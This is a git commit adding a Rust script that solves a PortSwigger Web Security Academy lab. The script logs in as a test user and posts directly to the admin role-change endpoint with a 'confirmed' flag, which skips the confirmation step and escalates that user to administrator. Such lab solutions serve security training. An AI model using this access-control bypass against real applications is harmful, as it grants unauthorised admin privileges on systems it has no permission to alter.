0ecf5ae605ea052023237785672c738b2497fbcf
Ahmed Elqalawii <elqalawii@proton.me>
2023-09-05 22:47:32 +0300

    Added 'Multi-step process with no access control on one step' lab

---
+++ Access control vulnerabilities/multi_step_process_with_no_access_control_on_one_step/src/main.rs
@@ -0,0 +1,115 @@
+/*************************************************************************
+*
+* Author: Ahmed Elqalawii
+*
+* Date: 5/9/2023
+*
+* PortSwigger LAB: Multi-step process with no access control on one step
+*
+* Steps: 1. Login as wiener
+*        2. Upgrade wiener to be an admin bypassing first step
+*
+**************************************************************************/
+#![allow(unused)]
+/***********
+* Imports
+***********/
+use regex::Regex;
+use reqwest::{
+    blocking::{Client, ClientBuilder, Response},
+    header::HeaderMap,
+    redirect::Policy,
+};
+use std::{
+    collections::HashMap,
+    io::{self, Write},
+    time::Duration,
+};
+use text_colorizer::Colorize;
+
+/******************
+* Main Function
+*******************/
+fn main() {
+    // change this to your lab URL
+    let url = "https://0a340082036cf1f582cc2b910058005a.web-security-academy.net";
+    // build the client used in all subsequent requests
+    let client = build_client();
+
+    // login as wiener
+    print!("{} ", "1. Logging in as wiener..".white());
+    io::stdout().flush();
+    let login = client
+        .post(format!("{url}/login"))
+        .form(&HashMap::from([
+            ("username", "wiener"),
+            ("password", "peter"),
+        ]))
+        .send()
+        .expect(&format!("{}", "[!] Failed to login as wiener".red()));
+    println!("{}", "OK".green());
+    let session = extract_session_cookie(login.headers())
+        .expect(&format!("{}", "[!] Failed to extract session cookie".red()));
+
+    // Upgrade wiener to be an admin bypassing first step
+    print!(
+        "{} ",
+        "2. Upgrading wiener to be an admin bypassing first step..".white()
+    );
+    io::stdout().flush();
+    let upgrade_wiener = client
+        .post(format!("{url}/admin-roles"))
+        .header("Cookie", format!("session={session}"))
+        .form(&HashMap::from([
+            ("username", "wiener"),
+            ("action", "upgrade"),
+            ("confirmed", "true"),
+        ]))
+        .send()
+        .expect(&format!(
+            "{}",
+            "[!] Failed to upgrade wiener to be an admin".red()
+        ));
+    println!("{}", "OK".green());
+
+    println!(
+        "{} {}",
+        "[#] Check your browser, it should be marked now as"
+            .white()
+            .bold(),
+        "solved".green().bold()
+    )
+}
+
+/*******************************************************************
+ * Function used to build the client
+ * Return a client that will be used in all subsequent requests
+ ********************************************************************/
+fn build_client() -> Client {
+    ClientBuilder::new()
+        .redirect(Policy::none())
+        .connect_timeout(Duration::from_secs(5))
+        .build()
+        .unwrap()
+}
+
+fn extract_session_cookie(headers: &HeaderMap) -> Option<String> {
+    let cookie = headers.get("set-cookie").unwrap().to_str().unwrap();
+    if let Some(session) = capture_pattern("session=(.*); Secure", cookie) {
+        Some(session.as_str().to_string())
+    } else {
+        None
+    }
+}
+
+/********************************************
+* Function to capture a pattern form a text
+*********************************************/
+fn capture_pattern(pattern: &str, text: &str) -> Option<String> {
+    let pattern = Regex::new(pattern).unwrap();
+    if let Some(text) = pattern.captures(text) {
+        Some(text.get(1).unwrap().as_str().to_string())
+    } else {
+        None
+    }
+}
